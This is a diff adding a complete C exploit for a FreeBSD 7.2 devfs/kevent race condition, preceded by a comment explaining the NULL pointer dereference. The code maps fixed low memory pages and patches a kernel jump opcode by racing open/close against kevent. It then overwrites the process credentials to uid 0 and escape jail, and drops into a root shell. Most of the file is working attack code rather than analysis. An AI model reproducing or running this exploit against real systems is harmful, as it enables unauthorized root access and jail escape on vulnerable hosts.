@@ -1,0 +1,208 @@
+#if 0
+FreeBSD 7.2 and below (including 6.4) are vulnerable to race condition in VFS
+and devfs code, resulting in NULL pointer dereference. In contrast to pipe race
+condition, this vulnerability is actually much harder to exploit.
+
+Due to uninitalised value in devfs_open(), following function is called with
+fp->f_vnode = 0:
+
+static int
+devfs_fp_check(struct file *fp, struct cdev **devp, struct cdevsw **dswp)
+{
+
+        *dswp = devvn_refthread(fp->f_vnode, devp);
+        if (*devp != fp->f_data) {
+                if (*dswp != NULL)
+[6]                        dev_relthread(*devp);
+                return (ENXIO);
+        }
+        KASSERT((*devp)->si_refcount > 0,
+            ("devfs: un-referenced struct cdev *(%s)", devtoname(*devp)));
+        if (*dswp == NULL)
+                return (ENXIO);
+        curthread->td_fpop = fp;
+        return (0);
+}
+
+
+struct cdevsw *
+devvn_refthread(struct vnode *vp, struct cdev **devp)
+{
+        struct cdevsw *csw;
+        struct cdev_priv *cdp;
+
+        mtx_assert(&devmtx, MA_NOTOWNED);
+        csw = NULL;
+        dev_lock();
+[1]        *devp = vp->v_rdev;
+        if (*devp != NULL) {
+[2]                cdp = (*devp)->si_priv;
+[3]                if ((cdp->cdp_flags & CDP_SCHED_DTR) == 0) {
+[4]                        csw = (*devp)->si_devsw;
+                        if (csw != NULL)
+[5]                                (*devp)->si_threadcount++;
+                }
+        }
+        dev_unlock();
+        return (csw);
+}
+
+In [1] vp is dereferenced, resulting in user-controllable *devp pointer (loaded
+from *0x1c). If values dereferenced in [2], [3] and [4] are reachable, at [5] we
+have memory write at user-controllable address. Unfortunately, the value is
+decremented in [6].
+
+In my exploit, I use si_threadcount incrementation to modify kernel code in
+devfs_fp_check(). Opcode at 0xc076c64b is "je" (0x74). After incrementation it
+changes to 0x75, which is "jne". Such modification results in not calling
+dev_relthread() at [6] and eventually leads to function pointer call in
+devfs_kqfilter_f().
+
+The following exploit code works only on default 7.2 kernel, due to hardcoded
+addresses:
+#endif
+
+/* 14.09.2009, babcia padlina 
+ * FreeBSD 7.2 devfs kevent() race condition exploit
+ *
+ * works only on multiprocessor systems
+ * compile with -lpthread
+ */
+
+#define JE_ADDRESS 0xc076c62b
+
+/* location of "je" (0x74) opcode in devfs_fp_check() - it will be incremented
+ * becoming "jne" (0x75), so error won't be returned in devfs_vnops.c:648
+ * and junk function pointer will be called in devfs_vnops.c:650
+ * 
+ * you can obtain it using:
+ * $ objdump -d /boot/kernel/kernel | grep -A 50 \<devfs_fp_check\>: | grep je | head -n 1 | cut -d: -f1
+ */
+
+#include <pthread.h>
+
+#define _KERNEL
+
+#include <sys/param.h>
+#include <sys/conf.h>
+#include <sys/ucred.h>
+#include <fs/devfs/devfs_int.h>
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/event.h>
+#include <sys/timespec.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/proc.h>
+
+int fd, kq;
+struct kevent kev, ke;
+struct timespec timeout;
+volatile int gotroot = 0;
+
+static void kernel_code(void) {
+	struct thread *thread;
+	gotroot = 1;
+	asm(
+		"movl %%fs:0, %0"
+		: "=r"(thread)
+	);
+	thread->td_proc->p_ucred->cr_uid = 0;
+	thread->td_proc->p_ucred->cr_prison = NULL;
+
+	return;
+}
+
+static void code_end(void) {
+	return;
+}
+
+void do_thread(void) {
+	usleep(100);
+
+	while (!gotroot) {
+		memset(&kev, 0, sizeof(kev));
+		EV_SET(&kev, fd, EVFILT_READ, EV_ADD, 0, 0, NULL);
+
+		if (kevent(kq, &kev, 1, &ke, 1, &timeout) < 0)
+			perror("kevent");
+
+	}
+
+	return;
+}
+
+void do_thread2(void) {
+	while(!gotroot) {
+		/* any devfs node will work */
+		if ((fd = open("/dev/null", O_RDONLY, 0600)) < 0)
+			perror("open");
+
+		close(fd);
+	}
+
+	return;
+}
+
+int main(void) {
+	int i;
+	pthread_t pth, pth2;
+	struct cdev devp;
+	char *p;
+	unsigned long *ap;
+
+	/* 0x1c used for vp->v_rdev dereference, when vp=0 */
+	/* 0xa5610e8 used for vp->r_dev->si_priv dereference */
+	/* 0x37e3e1c is junk dsw->d_kqfilter() in devfs_vnops.c:650 */
+
+	unsigned long pages[] = { 0x0, 0xa561000, 0x37e3000 };
+	unsigned long sizes[] = { 0xf000, 0x1000, 0x1000 }; 
+
+	for (i = 0; i < sizeof(pages) / sizeof(unsigned long); i++) {
+		printf("[*] allocating %p @ %p\n", sizes[i], pages[i]);
+		if (mmap((void *)pages[i], sizes[i], PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) == MAP_FAILED) {
+			perror("mmap");
+			return -1;
+		}
+	}
+
+	*(unsigned long *)0x1c = (unsigned long)(JE_ADDRESS - ((char *)&devp.si_threadcount - (char *)&devp));
+
+	p = (char *)pages[2];
+	ap = (unsigned long *)p;
+
+	for (i = 0; i < sizes[2] / 4; i++)
+		*ap++ = (unsigned long)&kernel_code;
+
+	if ((kq = kqueue()) < 0) {
+		perror("kqueue");
+		return -1;
+	}
+
+	pthread_create(&pth, NULL, (void *)do_thread, NULL);
+	pthread_create(&pth2, NULL, (void *)do_thread2, NULL);
+
+	timeout.tv_sec = 0;
+	timeout.tv_nsec = 1;
+
+	printf("waiting for root...\n");
+	i = 0;
+
+	while (!gotroot && i++ < 10000)
+		usleep(100);
+
+	setuid(0);
+
+	if (getuid()) {
+		printf("failed - system patched or not MP\n");
+		return -1;
+	}
+
+	execl("/bin/sh", "sh", NULL);
+
+	return 0;
+}
